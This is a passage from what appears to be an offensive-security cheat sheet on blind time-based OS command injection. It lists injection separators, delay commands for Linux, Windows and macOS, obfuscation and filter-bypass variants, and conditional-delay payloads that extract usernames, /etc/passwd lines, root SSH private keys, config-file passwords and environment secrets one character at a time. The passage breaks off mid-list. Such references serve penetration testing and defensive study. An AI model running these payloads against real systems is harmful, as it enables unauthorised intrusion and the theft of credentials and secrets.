---
title: Time-Based Command Injection Detection
description: Blind Time-Based OS Command Injection covering delay techniques, timing analysis, conditional extraction, multi-OS payloads, filter bypass, automation, data exfiltration, and advanced timing methods.
navigation:
  icon: i-lucide-timer
  title: Time-Based Command Injection
---

## Overview

Time-Based Blind Command Injection is used when injected commands execute on the server but produce no visible output in the HTTP response. The attacker introduces intentional delays using commands like `sleep`, `ping`, or `timeout` and measures the response time to infer whether the injection was successful and to extract data character by character.

::note
Time-based detection is the most commonly used blind injection technique because it requires no outbound connectivity from the target server (unlike OOB). It works even in heavily firewalled environments where DNS, HTTP, and ICMP egress are blocked.
::

### When to Use Time-Based Detection

::card-group
  ::card
  ---
  title: No Output Reflection
  icon: i-lucide-eye-off
  ---
  The application returns the same response regardless of command success or failure. No error messages, no output, no status indicators.
  ::

  ::card
  ---
  title: No OOB Channel
  icon: i-lucide-wifi-off
  ---
  Egress firewall blocks all outbound connections (DNS, HTTP, ICMP, SMB). No way to establish attacker-controlled callback.
  ::

  ::card
  ---
  title: Synchronous Execution
  icon: i-lucide-clock
  ---
  Commands execute synchronously in the HTTP request thread. The response is delayed by the injected delay command, making timing measurable.
  ::

  ::card
  ---
  title: Boolean Confirmation
  icon: i-lucide-binary
  ---
  Need to confirm injection exists before attempting OOB or other techniques. Time-based provides quick yes/no confirmation.
  ::

  ::card
  ---
  title: Data Extraction
  icon: i-lucide-database
  ---
  Extract data character by character using conditional delays. Slow but reliable method when no other channel is available.
  ::

  ::card
  ---
  title: WAF Evasion
  icon: i-lucide-shield-off
  ---
  Some WAFs block known OOB commands (curl, wget, nslookup) but allow delay commands. Time-based uses simpler, less-filtered primitives.
  ::
::

### Timing Methodology

::steps{level="4"}

#### Establish Baseline Response Time

Send multiple normal requests without any injection to measure the application's typical response time. Record average, minimum, and maximum latency.

```bash [Baseline Measurement]
# Measure baseline response time (5 samples)
for i in $(seq 1 5); do
  time curl -s -o /dev/null -w "%{time_total}" "http://target.com/page?input=normalvalue"
  echo ""
done

# Using curl with precise timing
curl -s -o /dev/null -w "DNS: %{time_namelookup}s\nConnect: %{time_connect}s\nTTFB: %{time_starttransfer}s\nTotal: %{time_total}s\n" "http://target.com/page?input=normalvalue"

# Average baseline with bc
total=0; for i in $(seq 1 10); do
  t=$(curl -s -o /dev/null -w "%{time_total}" "http://target.com/page?input=normalvalue")
  total=$(echo "$total + $t" | bc)
done
avg=$(echo "scale=3; $total / 10" | bc)
echo "Average baseline: ${avg}s"
```

#### Inject Delay Payload

Send a request with a time delay payload (e.g., `sleep 5`). If the response takes approximately 5 seconds longer than baseline, the injection is confirmed.

#### Validate with Different Delays

Confirm the injection by varying the delay duration. If `sleep 3` causes a 3-second delay and `sleep 7` causes a 7-second delay, this proves controllable command execution.

#### Extract Data Conditionally

Use conditional constructs (`if`, `test`, ternary operators) to introduce delays only when specific conditions are true, enabling character-by-character data extraction.

::

---

## Delay Command Reference

### Linux Delay Commands

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="sleep"}

  ```bash [sleep — Primary Delay Method]
  # Basic sleep (seconds)
  sleep 5
  sleep 10
  sleep 3

  # Fractional seconds (GNU coreutils)
  sleep 0.5
  sleep 1.5
  sleep 2.5

  # Sleep with suffix
  sleep 5s              # 5 seconds
  sleep 1m              # 1 minute
  sleep 0.1s            # 100ms

  # Sleep in different injection contexts
  ; sleep 5
  | sleep 5
  & sleep 5
  && sleep 5
  || sleep 5
  `sleep 5`
  $(sleep 5)
  %0asleep 5
  %0a%0dsleep 5

  # Sleep with filter bypass
  sl'e'ep 5
  sl"e"ep 5
  s\leep 5
  sl${x}eep 5
  /bin/sleep 5
  /bin/sl??p 5
  $'\x73\x6c\x65\x65\x70' 5
  $(printf '\x73\x6c\x65\x65\x70') 5
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="ping"}

  ```bash [ping — Network-Based Delay]
  # ping sends 1 packet per second by default
  # -c N = send N packets = approximately N second delay

  # Basic ping delay
  ping -c 5 127.0.0.1              # ~5 second delay
  ping -c 10 127.0.0.1             # ~10 second delay
  ping -c 3 127.0.0.1              # ~3 second delay

  # Injection contexts
  ; ping -c 5 127.0.0.1
  | ping -c 5 127.0.0.1
  & ping -c 5 127.0.0.1
  && ping -c 5 127.0.0.1
  || ping -c 5 127.0.0.1
  `ping -c 5 127.0.0.1`
  $(ping -c 5 127.0.0.1)

  # With output suppression
  ; ping -c 5 127.0.0.1 > /dev/null
  ; ping -c 5 127.0.0.1 > /dev/null 2>&1

  # Custom interval (-i flag)
  ; ping -c 1 -W 5 127.0.0.1      # 5 second timeout per packet
  ; ping -i 2 -c 3 127.0.0.1      # 2 sec interval × 3 packets = ~6 sec

  # Filter bypass
  ; p'i'n'g' -c 5 127.0.0.1
  ; p\ing -c 5 127.0.0.1
  ; /bin/ping -c 5 127.0.0.1
  ; ping${IFS}-c${IFS}5${IFS}127.0.0.1
  ; {ping,-c,5,127.0.0.1}
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Alternative Delays"}

  ```bash [Alternative Linux Delay Methods]
  # read with timeout (bash built-in — no external commands)
  ; read -t 5 x
  ; read -t 5 < /dev/null
  ; read -t 5 unused < /dev/null

  # Perl one-liner
  ; perl -e 'sleep(5)'
  ; perl -e 'select(undef,undef,undef,5)'
  ; perl -e 'use Time::HiRes "usleep"; usleep(5000000)'

  # Python one-liner
  ; python3 -c "import time;time.sleep(5)"
  ; python3 -c "__import__('time').sleep(5)"
  ; python -c "import time;time.sleep(5)"

  # Ruby one-liner
  ; ruby -e 'sleep(5)'
  ; ruby -e 'sleep 5'

  # PHP one-liner
  ; php -r 'sleep(5);'
  ; php -r 'usleep(5000000);'
  ; php -r 'time_sleep_until(time()+5);'

  # Node.js
  ; node -e "setTimeout(()=>{},5000); var w=Date.now(); while(Date.now()-w<5000){}"

  # Lua
  ; lua -e "os.execute('sleep 5')"

  # dd (read from /dev/zero slowly)
  ; dd if=/dev/zero of=/dev/null bs=1 count=1 iflag=fullblock 2>/dev/null & sleep 5 && kill $!

  # CPU-intensive delay (no sleep command needed)
  ; for i in $(seq 1 100000); do :; done
  ; awk 'BEGIN{for(i=0;i<10000000;i++){}}'
  ; python3 -c "sum(range(50000000))"
  ; perl -e '$x+=$_ for 1..50000000'

  # Filesystem-based delay (write large temp file)
  ; dd if=/dev/urandom of=/dev/null bs=1M count=50 2>/dev/null

  # /dev/tcp connection timeout
  ; bash -c 'echo > /dev/tcp/192.0.2.1/80' 2>/dev/null
  # 192.0.2.1 = TEST-NET (non-routable) — connection hangs for timeout duration

  # nc with timeout
  ; nc -z -w 5 192.0.2.1 80
  ; timeout 5 nc 192.0.2.1 80

  # curl with connection timeout
  ; curl --connect-timeout 5 http://192.0.2.1/ 2>/dev/null
  ; wget --timeout=5 http://192.0.2.1/ -O /dev/null 2>/dev/null

  # openssl with timeout
  ; timeout 5 openssl s_client -connect 192.0.2.1:443 2>/dev/null

  # nmap with delay
  ; nmap -p 80 --host-timeout 5s 192.0.2.1

  # Using usleep (microseconds, if available)
  ; usleep 5000000                  # 5 seconds in microseconds
  ```

  :::
::

### Windows Delay Commands

::tabs
  :::tabs-item{icon="i-lucide-monitor" label="timeout-ping"}

  ```cmd [Windows Delay Methods — CMD]
  timeout command (preferred)
  & timeout /t 5 /nobreak > nul
  & timeout /t 5
  && timeout /t 5 /nobreak > nul
  | timeout /t 5

  ping-based delay (most reliable, works everywhere)
  ping -n N = N-1 second delay (first ping is instant)
  & ping -n 6 127.0.0.1 > nul          :: ~5 second delay
  & ping -n 11 127.0.0.1 > nul         :: ~10 second delay
  & ping -n 4 127.0.0.1 > nul          :: ~3 second delay
  && ping -n 6 127.0.0.1 > nul
  | ping -n 6 127.0.0.1 > nul
  || ping -n 6 127.0.0.1 > nul

  choice command
  & choice /t 5 /d y > nul
  & choice /c yn /t 5 /d y > nul

  waitfor (can be useful for signaling)
  & waitfor /t 5 SomethingThatNeverComes 2>nul

  Caret bypass
  & t^i^m^e^o^u^t /t 5 /nobreak > nul
  & p^i^n^g -n 6 127.0.0.1 > nul

  Variable insertion bypass
  & ti%x%meou%y%t /t 5 /nobreak > nul
  & pin%x%g -n 6 127.0.0.1 > nul
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal-square" label="PowerShell"}

  ```powershell [Windows Delay Methods — PowerShell]
  # Start-Sleep cmdlet
  & powershell -c "Start-Sleep -Seconds 5"
  & powershell -c "Start-Sleep -s 5"
  & powershell -c "Start-Sleep 5"
  & powershell Start-Sleep 5
  & powershell -c "Start-Sleep -Milliseconds 5000"

  # .NET Thread.Sleep
  & powershell -c "[Threading.Thread]::Sleep(5000)"

  # Stopwatch-based busy wait (when Start-Sleep is blocked)
  & powershell -c "$sw=[Diagnostics.Stopwatch]::StartNew();while($sw.ElapsedMilliseconds -lt 5000){}"

  # Test-Connection (ping equivalent)
  & powershell -c "Test-Connection 127.0.0.1 -Count 5 -Quiet"

  # Using System.Net (connection timeout delay)
  & powershell -c "try{(New-Object Net.Sockets.TcpClient).Connect('192.0.2.1',80)}catch{}"

  # Encoded PowerShell
  & powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAANQA=
  # (Base64 of UTF-16LE "Start-Sleep -s 5")

  # Obfuscated
  & po^wer^she^ll -c "Start-Sleep 5"
  & powershell -c "S`t`a`r`t`-S`l`e`e`p 5"
  & powershell -c "& {Start-Sleep 5}"
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Alternative Windows Delays"}

  ```cmd [Alternative Windows Delay Techniques]
  W32tm (Windows Time Service)
  & w32tm /stripchart /computer:127.0.0.1 /period:5 /dataonly /samples:2 > nul

  PathPing (slow by design)
  & pathping -n -q 1 -p 5000 127.0.0.1 > nul

  nslookup to non-existent server (times out)
  & nslookup test 192.0.2.1

  certutil with non-routable IP (connection timeout)
  & certutil -urlcache -split -f http://192.0.2.1/ nul

  cmd /c with chained timeout
  & cmd /c "timeout /t 5 /nobreak > nul"

  PowerShell with WScript
  & powershell -c "(New-Object -COM WScript.Shell).Sleep(5000)"

  VBScript via cscript
  & echo WScript.Sleep 5000 > %TEMP%\d.vbs & cscript //nologo %TEMP%\d.vbs

  MSHTA with delay
  & mshta vbscript:Execute("WScript.Sleep 5000:close")
  ```

  :::
::

### macOS Delay Commands

```bash [macOS-Specific Delays]
# sleep (BSD version — supports integer seconds only by default)
; sleep 5

# gdate or GNU coreutils sleep (via Homebrew)
; gsleep 5
; gsleep 0.5

# Python (pre-installed on macOS)
; python3 -c "import time;time.sleep(5)"

# Perl (pre-installed on macOS)
; perl -e 'sleep(5)'

# Ruby (pre-installed on macOS)
; ruby -e 'sleep(5)'

# AppleScript (macOS-specific)
; osascript -e 'delay 5'

# ping (BSD version: -c count, -t timeout)
; ping -c 5 127.0.0.1
; ping -c 1 -t 5 127.0.0.1

# nc with timeout
; nc -z -G 5 192.0.2.1 80 2>/dev/null

# curl with timeout
; curl --connect-timeout 5 http://192.0.2.1 2>/dev/null
```

---

## Detection Payloads

### Systematic Detection Approach

::steps{level="4"}

#### Phase 1 — Test All Separators with Fixed Delay

```bash [Phase 1 Payloads — Linux]
# Test each separator with 5-second sleep
; sleep 5
| sleep 5
& sleep 5
&& sleep 5
|| sleep 5
`sleep 5`
$(sleep 5)
%0asleep 5
%0a%0dsleep 5
%0d sleep 5
%09sleep 5

# Newline variations
%0asleep%205
%0a%0dsleep%205
%0asleep${IFS}5

# With trailing comment to handle remaining command syntax
; sleep 5 #
; sleep 5 ;
; sleep 5 %23
```

```cmd [Phase 1 Payloads — Windows]
& ping -n 6 127.0.0.1 > nul
&& ping -n 6 127.0.0.1 > nul
| ping -n 6 127.0.0.1 > nul
|| ping -n 6 127.0.0.1 > nul
%0aping -n 6 127.0.0.1
& timeout /t 5 /nobreak > nul
& powershell Start-Sleep 5
```

#### Phase 2 — Validate with Variable Delays

```bash [Phase 2 — Confirm Controllability]
# If Phase 1 semicolon worked, validate:
; sleep 1       # Expect ~1s delay
; sleep 3       # Expect ~3s delay
; sleep 5       # Expect ~5s delay
; sleep 7       # Expect ~7s delay
; sleep 10      # Expect ~10s delay

# If ping worked:
; ping -c 2 127.0.0.1      # Expect ~2s
; ping -c 5 127.0.0.1      # Expect ~5s
; ping -c 8 127.0.0.1      # Expect ~8s

# Mathematical relationship confirms injection:
# If delay ≈ injected_seconds ± network_jitter → CONFIRMED
```

#### Phase 3 — Test Conditional Execution

```bash [Phase 3 — Conditional Delay]
# TRUE condition → delay should occur
; if [ 1 -eq 1 ]; then sleep 5; fi
; [ 1 -eq 1 ] && sleep 5
; test 1 -eq 1 && sleep 5

# FALSE condition → no delay
; if [ 1 -eq 2 ]; then sleep 5; fi
; [ 1 -eq 2 ] && sleep 5
; test 1 -eq 2 && sleep 5

# If TRUE causes delay and FALSE doesn't → Conditional extraction possible
```

#### Phase 4 — Extract First Character

```bash [Phase 4 — Data Extraction Start]
# Test if first character of whoami output is 'r' (for root)
; if [ "$(whoami | cut -c1)" = "r" ]; then sleep 5; fi
# If 5-second delay → first char is 'r'
# If no delay → first char is NOT 'r'

# Try other characters
; if [ "$(whoami | cut -c1)" = "w" ]; then sleep 5; fi
; if [ "$(whoami | cut -c1)" = "a" ]; then sleep 5; fi
# Continue until delay found
```

::

### Comprehensive Detection Payload Set

::collapsible

```bash [Complete Detection Payloads — Linux]
# ==========================================
# SEMICOLON SEPARATOR
# ==========================================
; sleep 5
; sleep 5 ;
; sleep 5 #
;sleep 5
;sleep 5;
;sleep 5#

# ==========================================
# PIPE SEPARATOR
# ==========================================
| sleep 5
|sleep 5
| sleep 5 |
| sleep 5 #

# ==========================================
# AMPERSAND SEPARATOR
# ==========================================
& sleep 5
&sleep 5
& sleep 5 &
& sleep 5 #

# ==========================================
# AND OPERATOR
# ==========================================
&& sleep 5
&&sleep 5
&& sleep 5 &&
&& sleep 5 #

# ==========================================
# OR OPERATOR
# ==========================================
|| sleep 5
||sleep 5
|| sleep 5 ||
|| sleep 5 #

# ==========================================
# COMMAND SUBSTITUTION
# ==========================================
`sleep 5`
$(sleep 5)
$(`sleep 5`)

# ==========================================
# NEWLINE / WHITESPACE INJECTION
# ==========================================
%0asleep 5
%0a%0dsleep 5
%0dsleep 5
%0bsleep 5
%0csleep 5
%09sleep 5
%0asleep%205
%0a%0dsleep%205

# ==========================================
# PING-BASED (when sleep is filtered)
# ==========================================
; ping -c 5 127.0.0.1
| ping -c 5 127.0.0.1
& ping -c 5 127.0.0.1
&& ping -c 5 127.0.0.1
|| ping -c 5 127.0.0.1
$(ping -c 5 127.0.0.1)
`ping -c 5 127.0.0.1`
%0aping -c 5 127.0.0.1

# ==========================================
# ALTERNATIVE DELAY COMMANDS
# ==========================================
; perl -e 'sleep(5)'
; python3 -c "import time;time.sleep(5)"
; python3 -c "__import__('time').sleep(5)"
; ruby -e 'sleep(5)'
; php -r 'sleep(5);'
; read -t 5 x
; read -t 5 < /dev/null

# ==========================================
# OBFUSCATED SLEEP
# ==========================================
; sl'e'ep 5
; sl"e"ep 5
; s\leep 5
; /bin/sleep 5
; /bin/sl??p 5
; $'\x73\x6c\x65\x65\x70' 5
; $(printf '\x73\x6c\x65\x65\x70') 5
; sl${z}eep 5

# ==========================================
# TIMEOUT / CONNECTION DELAY
# ==========================================
; curl --connect-timeout 5 http://192.0.2.1 2>/dev/null
; wget --timeout=5 http://192.0.2.1 -O /dev/null 2>/dev/null
; nc -z -w 5 192.0.2.1 80 2>/dev/null
; bash -c 'echo > /dev/tcp/192.0.2.1/80' 2>/dev/null
; timeout 5 cat /dev/zero > /dev/null

# ==========================================
# CONTEXT-SPECIFIC (inside quotes, expressions)
# ==========================================
"; sleep 5; echo "
'; sleep 5; echo '
"; sleep 5; #
'; sleep 5; #
$(sleep 5)
`sleep 5`
```

::

::collapsible

```cmd [Complete Detection Payloads — Windows]
:: AMPERSAND SEPARATOR
& ping -n 6 127.0.0.1 > nul
& timeout /t 5 /nobreak > nul
& powershell Start-Sleep 5

:: AND OPERATOR
&& ping -n 6 127.0.0.1 > nul
&& timeout /t 5 /nobreak > nul

:: PIPE
| ping -n 6 127.0.0.1 > nul
| timeout /t 5

:: OR OPERATOR
|| ping -n 6 127.0.0.1 > nul
|| timeout /t 5 /nobreak > nul

:: NEWLINE
%0aping -n 6 127.0.0.1
%0d%0aping -n 6 127.0.0.1

:: OBFUSCATED
& p^i^n^g -n 6 127.0.0.1 > nul
& ti%x%meout /t 5 /nobreak > nul
& pin%NOPE%g -n 6 127.0.0.1 > nul
& pow^ersh^ell Start-Sleep 5

:: POWERSHELL VARIATIONS
& powershell -c "Start-Sleep -Seconds 5"
& powershell -c "Start-Sleep -s 5"
& powershell -c "[Threading.Thread]::Sleep(5000)"
& powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAANQA=

:: ALTERNATIVE METHODS
& choice /t 5 /d y > nul
& w32tm /stripchart /computer:127.0.0.1 /period:5 /dataonly /samples:2 > nul
& mshta vbscript:Execute("WScript.Sleep 5000:close")
& certutil -urlcache -split -f http://192.0.2.1/ nul
```

::

---

## Conditional Time-Based Data Extraction

### Character-by-Character Extraction

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Linux — if/then"}

  ```bash [Conditional Extraction — if/then]
  # Extract username character by character
  # Position 1
  ; if [ "$(whoami | cut -c1)" = "a" ]; then sleep 5; fi
  ; if [ "$(whoami | cut -c1)" = "b" ]; then sleep 5; fi
  ; if [ "$(whoami | cut -c1)" = "c" ]; then sleep 5; fi
  # ... continue through alphabet until delay observed

  # Position 2
  ; if [ "$(whoami | cut -c2)" = "a" ]; then sleep 5; fi
  ; if [ "$(whoami | cut -c2)" = "b" ]; then sleep 5; fi
  # ... continue

  # Extract hostname
  ; if [ "$(hostname | cut -c1)" = "s" ]; then sleep 5; fi
  ; if [ "$(hostname | cut -c2)" = "e" ]; then sleep 5; fi

  # Extract file contents
  ; if [ "$(cat /etc/passwd | head -1 | cut -c1)" = "r" ]; then sleep 5; fi
  ; if [ "$(cat /etc/passwd | head -1 | cut -c2)" = "o" ]; then sleep 5; fi

  # Extract using substring
  ; if [ "${$(whoami):0:1}" = "r" ]; then sleep 5; fi
  ; if [ "${$(whoami):1:1}" = "o" ]; then sleep 5; fi

  # Extract current directory
  ; if [ "$(pwd | cut -c1)" = "/" ]; then sleep 5; fi
  ; if [ "$(pwd | cut -c2)" = "v" ]; then sleep 5; fi
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Linux — test && sleep"}

  ```bash [Conditional Extraction — Short Syntax]
  # Using test command with && (shorter payloads)
  ; [ "$(whoami | cut -c1)" = "r" ] && sleep 5
  ; [ "$(whoami | cut -c1)" = "w" ] && sleep 5
  ; [ "$(whoami | cut -c2)" = "o" ] && sleep 5
  ; [ "$(whoami | cut -c2)" = "w" ] && sleep 5

  # Using grep for pattern matching
  ; whoami | grep -q "^r" && sleep 5
  ; whoami | grep -q "^ro" && sleep 5
  ; whoami | grep -q "^roo" && sleep 5
  ; whoami | grep -q "^root" && sleep 5

  # Using case statement
  ; case $(whoami | cut -c1) in r) sleep 5;; esac
  ; case $(whoami | cut -c1) in w) sleep 5;; esac

  # Check if specific user
  ; [ "$(whoami)" = "root" ] && sleep 5
  ; [ "$(whoami)" = "www-data" ] && sleep 5
  ; [ "$(whoami)" = "apache" ] && sleep 5
  ; [ "$(whoami)" = "nginx" ] && sleep 5
  ; [ "$(whoami)" = "node" ] && sleep 5

  # Check file existence
  ; [ -f /etc/shadow ] && sleep 5
  ; [ -f /root/.ssh/id_rsa ] && sleep 5
  ; [ -f /var/www/html/config.php ] && sleep 5
  ; [ -d /home/admin ] && sleep 5

  # Check if running as root
  ; [ "$(id -u)" = "0" ] && sleep 5

  # Check OS
  ; [ "$(uname -s)" = "Linux" ] && sleep 5
  ; [ "$(uname -s)" = "Darwin" ] && sleep 5
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Linux — ASCII Binary Search"}

  ```bash [Binary Search Extraction — Faster]
  # Binary search using ASCII values — reduces guesses from 95 to ~7 per character

  # Check if ASCII value of first char > 'm' (109)
  ; if [ $(whoami | cut -c1 | od -A n -td1 | tr -d ' ') -gt 109 ]; then sleep 3; fi

  # If delay → char > 'm', test > 's' (115)
  ; if [ $(whoami | cut -c1 | od -A n -td1 | tr -d ' ') -gt 115 ]; then sleep 3; fi

  # If no delay → char <= 's', test > 'p' (112)
  ; if [ $(whoami | cut -c1 | od -A n -td1 | tr -d ' ') -gt 112 ]; then sleep 3; fi

  # Continue narrowing until exact character found
  # if > 112 delays, but > 113 doesn't → char is ASCII 113 = 'q'

  # Alternative: using printf for ASCII extraction
  ; if [ $(printf '%d' "'$(whoami | cut -c1)") -gt 109 ]; then sleep 3; fi
  ; if [ $(printf '%d' "'$(whoami | cut -c1)") -gt 115 ]; then sleep 3; fi
  ; if [ $(printf '%d' "'$(whoami | cut -c1)") -eq 114 ]; then sleep 3; fi

  # Using awk for ASCII
  ; if [ $(whoami | cut -c1 | awk '{printf "%d", $1}' OFMT='%d' | head -c3) -gt 109 ]; then sleep 3; fi

  # For extracting string length first
  ; if [ $(whoami | wc -c) -gt 4 ]; then sleep 3; fi
  ; if [ $(whoami | wc -c) -gt 6 ]; then sleep 3; fi
  ; if [ $(whoami | wc -c) -eq 5 ]; then sleep 3; fi
  # Length = 5 means 4 chars + newline → username is 4 chars (e.g., "root")
  ```

  :::

  :::tabs-item{icon="i-lucide-monitor" label="Windows Extraction"}

  ```cmd [Conditional Extraction — Windows CMD]
  Extract username character by character
  Check if first character of USERNAME is 'A'
  & if "%USERNAME:~0,1%"=="A" ping -n 6 127.0.0.1 > nul
  & if "%USERNAME:~0,1%"=="a" ping -n 6 127.0.0.1 > nul
  & if "%USERNAME:~0,1%"=="B" ping -n 6 127.0.0.1 > nul

  Position 2
  & if "%USERNAME:~1,1%"=="d" ping -n 6 127.0.0.1 > nul
  & if "%USERNAME:~1,1%"=="e" ping -n 6 127.0.0.1 > nul

  Check full username
  & if "%USERNAME%"=="Administrator" ping -n 6 127.0.0.1 > nul
  & if "%USERNAME%"=="admin" ping -n 6 127.0.0.1 > nul

  Check computername
  & if "%COMPUTERNAME:~0,1%"=="W" ping -n 6 127.0.0.1 > nul

  Check OS version
  & if "%OS%"=="Windows_NT" ping -n 6 127.0.0.1 > nul

  File existence check
  & if exist C:\flag.txt ping -n 6 127.0.0.1 > nul
  & if exist C:\Users\Administrator ping -n 6 127.0.0.1 > nul
  & if exist C:\inetpub\wwwroot\web.config ping -n 6 127.0.0.1 > nul
  ```

  ```powershell [Conditional Extraction — Windows PowerShell]
  # Character extraction
  & powershell -c "if((whoami)[0] -eq 'a'){Start-Sleep 5}"
  & powershell -c "if((whoami)[1] -eq 'd'){Start-Sleep 5}"
  & powershell -c "if((whoami).Length -gt 10){Start-Sleep 5}"

  # Environment variable extraction
  & powershell -c "if($env:USERNAME[0] -eq 'A'){Start-Sleep 5}"
  & powershell -c "if($env:COMPUTERNAME[0] -eq 'W'){Start-Sleep 5}"

  # File content extraction
  & powershell -c "if((Get-Content C:\flag.txt)[0] -eq 'f'){Start-Sleep 5}"

  # File existence
  & powershell -c "if(Test-Path C:\flag.txt){Start-Sleep 5}"
  & powershell -c "if(Test-Path C:\Users\Administrator){Start-Sleep 5}"

  # Registry check
  & powershell -c "if(Test-Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'){Start-Sleep 5}"

  # Service check
  & powershell -c "if((Get-Service 'WinRM').Status -eq 'Running'){Start-Sleep 5}"
  ```

  :::
::

### Extracting Specific Data

::tabs
  :::tabs-item{icon="i-lucide-file-text" label="File Contents"}

  ```bash [Extract File Contents — Linux]
  # Extract /etc/passwd first line, character by character
  ; if [ "$(head -1 /etc/passwd | cut -c1)" = "r" ]; then sleep 3; fi
  ; if [ "$(head -1 /etc/passwd | cut -c2)" = "o" ]; then sleep 3; fi
  ; if [ "$(head -1 /etc/passwd | cut -c3)" = "o" ]; then sleep 3; fi
  ; if [ "$(head -1 /etc/passwd | cut -c4)" = "t" ]; then sleep 3; fi

  # Extract specific line using sed
  ; if [ "$(sed -n '2p' /etc/passwd | cut -c1)" = "d" ]; then sleep 3; fi

  # Extract using awk
  ; if [ "$(awk 'NR==1{print $1}' /etc/passwd | cut -c1)" = "r" ]; then sleep 3; fi

  # Count lines in file
  ; if [ $(wc -l < /etc/passwd) -gt 20 ]; then sleep 3; fi
  ; if [ $(wc -l < /etc/passwd) -gt 30 ]; then sleep 3; fi

  # Check file permissions
  ; if [ -r /etc/shadow ]; then sleep 3; fi
  ; if [ -w /var/www/html/ ]; then sleep 3; fi
  ; if [ -x /usr/bin/python3 ]; then sleep 3; fi

  # Extract SSH private key
  ; if [ "$(head -1 /root/.ssh/id_rsa | cut -c1-5)" = "-----" ]; then sleep 3; fi

  # Extract config file values
  ; if [ "$(grep 'password' /var/www/html/config.php | head -1 | cut -c1)" = "p" ]; then sleep 3; fi
  ```

  :::

  :::tabs-item{icon="i-lucide-network" label="Network Info"}

  ```bash [Extract Network Information]
  # Check if specific port is listening
  ; if netstat -tlnp 2>/dev/null | grep -q ':3306'; then sleep 3; fi
  ; if netstat -tlnp 2>/dev/null | grep -q ':5432'; then sleep 3; fi
  ; if ss -tlnp | grep -q ':8080'; then sleep 3; fi
  ; if ss -tlnp | grep -q ':22'; then sleep 3; fi

  # Extract IP address characters
  ; if [ "$(hostname -I | cut -d' ' -f1 | cut -d. -f1)" = "10" ]; then sleep 3; fi
  ; if [ "$(hostname -I | cut -d' ' -f1 | cut -d. -f1)" = "172" ]; then sleep 3; fi
  ; if [ "$(hostname -I | cut -d' ' -f1 | cut -d. -f1)" = "192" ]; then sleep 3; fi

  # Check network interfaces
  ; if ifconfig eth0 >/dev/null 2>&1; then sleep 3; fi
  ; if ifconfig ens33 >/dev/null 2>&1; then sleep 3; fi

  # Check DNS resolver
  ; if [ "$(cat /etc/resolv.conf | grep nameserver | head -1 | awk '{print $2}' | cut -d. -f1)" = "8" ]; then sleep 3; fi

  # Check if Docker environment
  ; if [ -f /.dockerenv ]; then sleep 3; fi
  ; if grep -q docker /proc/1/cgroup 2>/dev/null; then sleep 3; fi

  # Check if Kubernetes
  ; if [ -n "$KUBERNETES_SERVICE_HOST" ]; then sleep 3; fi
  ```

  :::

  :::tabs-item{icon="i-lucide-users" label="System Enumeration"}

  ```bash [System Enumeration via Timing]
  # Check kernel version components
  ; if [ "$(uname -r | cut -d. -f1)" = "5" ]; then sleep 3; fi
  ; if [ "$(uname -r | cut -d. -f1)" = "4" ]; then sleep 3; fi
  ; if [ "$(uname -r | cut -d. -f2)" -gt 10 ]; then sleep 3; fi

  # Check distribution
  ; if grep -qi "ubuntu" /etc/os-release 2>/dev/null; then sleep 3; fi
  ; if grep -qi "debian" /etc/os-release 2>/dev/null; then sleep 3; fi
  ; if grep -qi "centos" /etc/os-release 2>/dev/null; then sleep 3; fi
  ; if grep -qi "alpine" /etc/os-release 2>/dev/null; then sleep 3; fi

  # Check installed software
  ; if which python3 >/dev/null 2>&1; then sleep 3; fi
  ; if which gcc >/dev/null 2>&1; then sleep 3; fi
  ; if which docker >/dev/null 2>&1; then sleep 3; fi
  ; if which kubectl >/dev/null 2>&1; then sleep 3; fi
  ; if which mysql >/dev/null 2>&1; then sleep 3; fi
  ; if which psql >/dev/null 2>&1; then sleep 3; fi
  ; if which nc >/dev/null 2>&1; then sleep 3; fi
  ; if which nmap >/dev/null 2>&1; then sleep 3; fi
  ; if which curl >/dev/null 2>&1; then sleep 3; fi
  ; if which wget >/dev/null 2>&1; then sleep 3; fi

  # Check sudo privileges
  ; if sudo -n true 2>/dev/null; then sleep 3; fi
  ; if [ -w /etc/sudoers ]; then sleep 3; fi

  # Check SUID binaries
  ; if [ $(find / -perm -4000 2>/dev/null | wc -l) -gt 10 ]; then sleep 3; fi

  # Check number of users
  ; if [ $(wc -l < /etc/passwd) -gt 20 ]; then sleep 3; fi
  ; if [ $(wc -l < /etc/passwd) -gt 50 ]; then sleep 3; fi

  # Check writable directories
  ; if [ -w /tmp ]; then sleep 3; fi
  ; if [ -w /var/tmp ]; then sleep 3; fi
  ; if [ -w /dev/shm ]; then sleep 3; fi
  ; if [ -w /var/www/html ]; then sleep 3; fi

  # Check cron jobs
  ; if [ -f /etc/crontab ]; then sleep 3; fi
  ; if [ $(ls /etc/cron.d/ 2>/dev/null | wc -l) -gt 0 ]; then sleep 3; fi

  # Check environment variables containing secrets
  ; if env | grep -qi "password"; then sleep 3; fi
  ; if env | grep -qi "secret"; then sleep 3; fi
  ; if env | grep -qi "api_key"; then sleep 3; fi
  ; if env | grep -qi "token"; then sleep 3; fi
  ; if env | grep -qi "database"; then sleep 3; fi
  ```

  :::
::

---

## Filter Bypass for Delay Commands

### When `sleep` is Blocked

::collapsible

```bash [Sleep Alternatives When Filtered]
# Ping-based delay (most common fallback)
; ping -c 5 127.0.0.1
; ping -c 5 localhost

# Read timeout (bash built-in — no external command)
; read -t 5 x
; read -t 5 unused < /dev/null

# /dev/tcp connection timeout (bash built-in)
; bash -c 'echo > /dev/tcp/192.0.2.1/80' 2>/dev/null
; (echo > /dev/tcp/192.0.2.1/80) 2>/dev/null

# curl/wget timeout against non-routable IP
; curl --connect-timeout 5 http://192.0.2.1/ 2>/dev/null
; wget --timeout=5 http://192.0.2.1/ -O /dev/null 2>/dev/null

# nc with timeout
; nc -z -w 5 192.0.2.1 80 2>/dev/null

# timeout command wrapper
; timeout 5 cat /dev/zero > /dev/null 2>&1

# Python delay
; python3 -c "__import__('time').sleep(5)"
; python3 -c "import time;time.sleep(5)"

# Perl delay
; perl -e 'sleep(5)'
